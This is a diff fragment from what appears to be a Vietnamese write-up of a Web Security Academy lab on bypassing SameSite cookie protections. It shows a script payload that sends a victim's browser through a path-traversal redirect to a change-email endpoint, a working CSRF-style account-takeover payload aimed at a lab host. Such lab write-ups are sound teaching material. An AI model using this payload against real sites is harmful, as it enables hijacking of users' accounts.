@@ -38,7 +38,7 @@ Vậy thì giờ ta hãy lợi dụng nó để cho nó cùng site để còn by
 
 ```
 <script>
-    document.location = "https://0a950078046f5823d8bf2d5900db0094.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=abc@gmail.com%26submit=1";
+    document.location = "https://0a950078046f5823d8bf2d5900db0094.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=abc@gmail.com%26submit=1";
 </script>
 ```
 
